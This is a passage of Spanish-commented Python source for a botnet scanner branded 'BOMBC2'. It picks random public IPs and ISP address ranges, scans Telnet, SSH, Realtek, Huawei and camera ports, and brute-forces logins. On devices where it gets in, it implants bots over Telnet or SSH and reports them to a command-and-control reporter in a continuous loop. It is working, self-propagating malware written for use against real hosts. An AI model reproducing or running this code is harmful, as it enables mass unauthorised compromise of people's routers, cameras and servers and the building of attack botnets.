            stdin, stdout, stderr = ssh.exec_command(deploy_cmd, timeout=10)
            time.sleep(2)
            
            stdin, stdout, stderr = ssh.exec_command("ps aux | grep .b | grep -v grep", timeout=5)
            check = stdout.read().decode('utf-8', errors='ignore')
            
            ssh.close()
            return '.b' in check
            
        except Exception as e:
            if ssh:
                try:
                    ssh.close()
                except:
                    pass
            print(f"{RED}[BOT] Error en deploy_ssh: {e}")
            return False

class TargetExpansion:
    
    @staticmethod
    def get_expanded_ports() -> List[int]:
        return [22, 23, 21, 80, 443, 8080, 2222, 2323, 3389, 5900, 5901, 52869, 37215, 554, 37777, 9000, 9001]
    
    @staticmethod
    def generate_isp_targets() -> List[str]:
        isp_ranges = [
            ("71.0.0.0", "71.255.255.255"),
            ("96.0.0.0", "96.63.255.255"),
            ("73.0.0.0", "73.255.255.255"),
            ("98.0.0.0", "98.255.255.255"),
            ("12.0.0.0", "12.255.255.255"),
            ("99.0.0.0", "99.255.255.255"),
            ("84.0.0.0", "84.255.255.255"),
            ("78.0.0.0", "78.255.255.255"),
            ("177.0.0.0", "177.255.255.255"),
            ("187.0.0.0", "187.255.255.255"),
            ("46.0.0.0", "46.255.255.255"),
            ("95.0.0.0", "95.255.255.255"),
        ]
        
        targets = []
        for start, end in isp_ranges:
            start_int = int(ipaddress.IPv4Address(start))
            end_int = int(ipaddress.IPv4Address(end))
            
            # Muestrear aleatoriamente
            sample_size = min(2000, (end_int - start_int + 1) // 1000)
            for _ in range(sample_size):
                ip_int = random.randint(start_int, end_int)
                ip = str(ipaddress.IPv4Address(ip_int))
                targets.append(ip)
        
        return list(set(targets))[:10000]  # Limitar a 10,000 únicos

class OptimizedScanner:
    
    def __init__(self):
        self.batch_size = 200
        self.timeout = 3.0
        self.max_workers = 200  # Reducido para mayor estabilidad
        self.realtek_scanner = RealtekScanner()
        self.huawei_scanner = HuaweiScanner()
        self.camera_scanner = CameraScanner()
    
    def parallel_credential_test(self, targets: List[Tuple[str, int, str]]) -> List[ScanResult]:
        results = []
        
        def process_target(target):
            ip, port, scanner_type = target
            
            try:
                if scanner_type == "TELNET":
                    success, creds, confidence, success_rate, device_type, architecture = CredentialTester.test_telnet_enhanced(ip, port)
                elif scanner_type == "SSH":
                    success, creds, confidence, success_rate, architecture = CredentialTester.test_ssh_enhanced(ip, port)
                    device_type = "unknown"
                elif scanner_type == "REALTEK":
                    result = self.realtek_scanner.scan(ip)
                    if result:
                        return result
                    return None
                elif scanner_type == "HUAWEI":
                    result = self.huawei_scanner.scan(ip)
                    if result:
                        return result
                    return None
                elif scanner_type == "CAMERA":
                    result = self.camera_scanner.scan(ip)
                    if result:
                        return result
                    return None
                else:
                    return None
                
                if success and confidence >= 50:  # Umbral más bajo
                    final_score = SmartScoringSystem.calculate_comprehensive_score(
                        creds, device_type, success_rate, port, architecture
                    )
                    
                    if final_score >= 60:  # Umbral más bajo
                        result = ScanResult(
                            scanner_type=scanner_type,
                            ip=ip,
                            port=port,
                            credentials=creds,
                            success=True,
                            bot_deployed=False,
                            confidence=final_score
                        )
                        result.device_type = device_type
                        result.command_success_rate = success_rate
                        result.architecture = architecture
                        return result
                
                return None
                
            except Exception as e:
                return None
        
        # Procesar en lotes más pequeños
        batch_size = 50
        for i in range(0, len(targets), batch_size):
            batch = targets[i:i+batch_size]
            
            with ThreadPoolExecutor(max_workers=min(self.max_workers, len(batch))) as executor:
                futures = {executor.submit(process_target, target): target for target in batch}
                
                for future in as_completed(futures):
                    try:
                        result = future.result(timeout=15)  # Timeout aumentado
                        if result:
                            results.append(result)
                    except Exception as e:
                        continue
            
            time.sleep(0.1)  # Pequeña pausa entre lotes
        
        return results

class MassScanner:
    def __init__(self):
        self.reporter = CNCReporter()
        self.connection_manager = ConnectionManager(MAX_CONCURRENT_SCANS)
        self.optimized_scanner = OptimizedScanner()
        self.is_root = os.geteuid() == 0
        
        self.stats = {
            'total_ips': 0,
            'open_ports': 0,
            'successful_logins': 0,
            'bots_deployed': 0,
            'real_devices': 0,
            'start_time': time.time(),
            'cycles_completed': 0
        }
        self.stats_lock = threading.Lock()
        
        self.running = False
        
    def initialize(self):
        print(GREEN + "=" * 70)
        print(GREEN + "ENHANCED MASS SCANNER v4.1 - MULTI-EXPLOIT")
        print(GREEN + "=" * 70)
        
        if self.is_root:
            print(GREEN + f"[+] ROOT DETECTADO - Escaneo masivo activado")
            # Verificar herramientas
            self._check_tools()
        else:
            print(YELLOW + "[!] Sin root - Modo rápido limitado")
        
        self.reporter.start()
        time.sleep(1)
        
    def _check_tools(self):
        tools = {
            "zmap": ["zmap", "--version"],
            "masscan": ["masscan", "--version"],
            "nmap": ["nmap", "--version"]
        }
        
        for tool, cmd in tools.items():
            try:
                subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
                print(f"{GREEN}[+] {tool.upper()} detectado")
            except:
                print(f"{YELLOW}[!] {tool.upper()} no encontrado")
    
    def masscan_scan_phase(self) -> Dict[int, List[str]]:
        print(GREEN + "\n[FASE 1] Escaneo MASSCAN...")
        
        if not self.is_root:
            print(YELLOW + "[!] Se necesita root para masscan")
            return {}
        
        ports = [22, 23, 80, 443, 52869, 37215, 8080, 554]
        scanner = MasscanScanner(ports)
        results = scanner.scan_with_masscan(max_targets=500000)
        
        total_ips = sum(len(ips) for ips in results.values())
        with self.stats_lock:
            self.stats['total_ips'] += total_ips
        
        print(GREEN + f"[+] Escaneo masscan completado: {total_ips} IPs encontradas")
        return results
    
    def fast_scan_phase(self) -> Dict[int, List[str]]:
        print(GREEN + "\n[FASE 1] Escaneo rápido...")
        
        # Generar más IPs aleatorias
        all_ips = []
        
        # IPs aleatorias
        for _ in range(3):
            batch = self._generate_random_ips(20000)
            all_ips.extend(batch)
        
        # IPs de ISPs
        isp_ips = TargetExpansion.generate_isp_targets()
        all_ips.extend(isp_ips)
        
        # Remover duplicados
        all_ips = list(set(all_ips))
        
        print(f"{CYAN}[+] Escaneando {len(all_ips)} IPs...")
        
        ports = TargetExpansion.get_expanded_ports()
        scanner = FastPortScanner(ports)
        
        # Escanear en lotes más pequeños
        batch_size = 5000
        all_results = {port: [] for port in ports}
        
        for i in range(0, len(all_ips), batch_size):
            batch = all_ips[i:i+batch_size]
            print(f"{CYAN}[+] Lote {i//batch_size + 1}/{(len(all_ips)+batch_size-1)//batch_size}")
            
            batch_results = scanner.scan_batch(batch, timeout=1.5)
            
            for port in ports:
                all_results[port].extend(batch_results[port])
            
            # Mostrar progreso
            total_open = sum(len(ips) for ips in all_results.values())
            print(f"{CYAN}[+] Progreso: {total_open} puertos abiertos encontrados")
        
        total_open = sum(len(ips) for ips in all_results.values())
        with self.stats_lock:
            self.stats['total_ips'] += len(all_ips)
            self.stats['open_ports'] += total_open
        
        print(GREEN + f"[+] Escaneo rápido completado: {total_open} puertos abiertos")
        return all_results
    
    def _generate_random_ips(self, count: int) -> List[str]:
        ips = []
        blacklist = [
            "0.0.0.0/8", "10.0.0.0/8", "100.64.0.0/10", "127.0.0.0/8",
            "169.254.0.0/16", "172.16.0.0/12", "192.0.0.0/24",
            "192.0.2.0/24", "192.88.99.0/24", "192.168.0.0/16",
            "198.18.0.0/15", "198.51.100.0/24", "203.0.113.0/24",
            "224.0.0.0/4", "240.0.0.0/4", "255.255.255.255/32"
        ]
        
        blacklist_nets = [ipaddress.ip_network(net) for net in blacklist]
        
        generated = 0
        while generated < count:
            octet1 = random.randint(1, 223)
            octet2 = random.randint(0, 255)
            octet3 = random.randint(0, 255)
            octet4 = random.randint(1, 254)
            
            ip_str = f"{octet1}.{octet2}.{octet3}.{octet4}"
            ip = ipaddress.IPv4Address(ip_str)
            
            # Verificar si está en blacklist
            in_blacklist = False
            for net in blacklist_nets:
                if ip in net:
                    in_blacklist = True
                    break
            
            if not in_blacklist:
                ips.append(ip_str)
                generated += 1
        
        return ips
    
    def credential_test_phase(self, targets: Dict[int, List[str]]):
        print(GREEN + "\n[FASE 2] Testeo multi-exploit...")
        
        scan_targets = []
        
        port_scanner_map = {
            23: "TELNET",
            2323: "TELNET",
            22: "SSH",
            2222: "SSH",
            52869: "REALTEK",
            37215: "HUAWEI",
            80: "CAMERA",
            443: "CAMERA",
            8080: "CAMERA",
            554: "CAMERA",
            37777: "CAMERA",
        }
        
        for port, ips in targets.items():
            if not ips:
                continue
            
            scanner_type = port_scanner_map.get(port)
            if not scanner_type:
                continue
            
            # Limitar por puerto para no sobrecargar
            max_per_port = 800 if self.is_root else 300
            for ip in ips[:max_per_port]:
                scan_targets.append((ip, port, scanner_type))
        
        if not scan_targets:
            print(YELLOW + "[!] No hay objetivos para testear")
            return
        
        print(CYAN + f"[+] Testeando {len(scan_targets)} objetivos con multi-exploit...")
        
        results = self.optimized_scanner.parallel_credential_test(scan_targets)
        
        with self.stats_lock:
            self.stats['successful_logins'] += len(results)
            self.stats['real_devices'] = sum(1 for r in results if r.confidence >= 70)
            self.stats['cycles_completed'] += 1
        
        for result in results:
            if result.confidence >= 70:
                color = GREEN
                device_status = "REAL"
            elif result.confidence >= 50:
                color = YELLOW
                device_status = "POSIBLE"
            else:
                continue
            
            creds_display = f"{result.credentials[0]}:{result.credentials[1]}" if result.credentials else "NO_AUTH"
            print(f"{color}[{result.scanner_type}] {result.ip}:{result.port} - {creds_display} - CONF:{result.confidence} - {result.device_type} ({result.architecture}) - {device_status}")
            
            if result.confidence >= 65:  # Umbral más bajo para deploy
                bot_deployed = False
                try:
                    if result.scanner_type == "TELNET" and result.credentials:
                        bot_deployed = BotDeployer.deploy_telnet(
                            result.ip, result.port, result.credentials, result.device_type, result.architecture
                        )
                    elif result.scanner_type == "SSH" and result.credentials:
                        bot_deployed = BotDeployer.deploy_ssh(result.ip, result.port, result.credentials, result.architecture)
                    elif result.scanner_type in ["REALTEK", "HUAWEI", "CAMERA"]:
                        bot_deployed = BotDeployer.deploy_telnet(
                            result.ip, result.port, ("root", ""), result.device_type, result.architecture
                        )
                    
                    if bot_deployed:
                        result.bot_deployed = True
                        with self.stats_lock:
                            self.stats['bots_deployed'] += 1
                        print(GREEN + f"[+] Bot implantado en {result.ip} ({result.architecture})")
                    else:
                        print(YELLOW + f"[!] Falló implantación en {result.ip}")
                        
                except Exception as e:
                    print(RED + f"[!] Error en implantación: {e}")
                
                # Reportar siempre que haya confianza suficiente
                if result.confidence >= 60:
                    self.reporter.report(result)
    
    def start_continuous_scan(self):
        self.running = True
        
        scan_thread = threading.Thread(target=self._continuous_scanner, daemon=True)
        scan_thread.start()
        
        stats_thread = threading.Thread(target=self._stats_monitor, daemon=True)
        stats_thread.start()
        
        return scan_thread
    
    def _continuous_scanner(self):
        cycle = 0
        while self.running:
            cycle += 1
            print(f"\n{CYAN}{'='*70}")
            print(f"{CYAN}[CICLO {cycle}] Iniciando escaneo exploit...")
            print(f"{CYAN}{'='*70}")
            
            try:
                # Alternar entre masscan y escaneo rápido
                if self.is_root and cycle % 3 == 0:  # Cada 3 ciclos usar masscan
                    targets = self.masscan_scan_phase()
                    if not targets or sum(len(v) for v in targets.values()) == 0:
                        print(YELLOW + "[!] Masscan no encontró objetivos, usando escaneo rápido")
                        targets = self.fast_scan_phase()
                else:
                    targets = self.fast_scan_phase()
                
                if targets and any(len(v) > 0 for v in targets.values()):
                    self.credential_test_phase(targets)
                else:
                    print(YELLOW + "[!] No se encontraron objetivos en este ciclo")
                
            except Exception as e:
                print(RED + f"[!] Error en ciclo {cycle}: {e}")
                import traceback
                traceback.print_exc()
            
            # Tiempo de espera entre ciclos
            wait_time = 30 if self.is_root else 45
            print(f"{CYAN}[+] Esperando {wait_time} segundos para próximo ciclo...")
            for i in range(wait_time):
                if not self.running:
                    break
                time.sleep(1)
                if i % 10 == 0:
                    print(f"{CYAN}[+] {wait_time - i} segundos restantes...")
    
    def _stats_monitor(self):
        while self.running:
            time.sleep(30)  # Actualizar cada 30 segundos
            
            with self.stats_lock:
                elapsed = time.time() - self.stats['start_time']
                hours = int(elapsed // 3600)
                minutes = int((elapsed % 3600) // 60)
                seconds = int(elapsed % 60)
                
                ips_per_sec = self.stats['total_ips'] / elapsed if elapsed > 0 else 0
                cycles = self.stats['cycles_completed']
                
                print(f"\n{GREEN}{'='*70}")
                print(f"{GREEN}EXPLOIT SCANNER - ESTADÍSTICAS")
                print(f"{GREEN}{'='*70}{RESET}")
                print(f"Tiempo ejecución: {hours:02d}:{minutes:02d}:{seconds:02d}")
                print(f"Ciclos completados: {cycles}")
                print(f"IPs testeadas: {self.stats['total_ips']:,}")
                print(f"Puertos abiertos: {self.stats['open_ports']:,}")
                print(f"Dispositivos reales: {self.stats['real_devices']:,}")
                print(f"Logins exitosos: {self.stats['successful_logins']:,}")
                print(f"Bots implantados: {self.stats['bots_deployed']:,}")
                if elapsed > 0:
                    print(f"Velocidad: {ips_per_sec:.1f} IPs/segundo")
                print(f"{GREEN}{'='*70}{RESET}")
    
    def stop(self):
        print(YELLOW + "\n[!] Deteniendo scanner...")
        self.running = False
        self.reporter.stop()
        time.sleep(2)
        print(YELLOW + "[!] Scanner detenido")

def main():
    print(CYAN + "Inicializando scanner...")
    
    scanner = MassScanner()
    
    try:
        scanner.initialize()
        time.sleep(2)
        
        print(CYAN + "\n" + "="*70)
        print(CYAN + "BOMBC2 - SCANNER ACTIVADO")
        print(CYAN + "="*70)
        print(CYAN + "Presiona Ctrl+C para detener")
        print(CYAN + "="*70)
        
        scanner.start_continuous_scan()
        
        # Mantener el programa ejecutándose
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print(YELLOW + "\n[!] Interrumpido por el usuario")
    except Exception as e:
        print(RED + f"\n[!] Error crítico: {e}")
        import traceback
        traceback.print_exc()
    finally:
        scanner.stop()
        print(RED + "\n[!] Programa terminado")

if __name__ == "__main__":
    main()
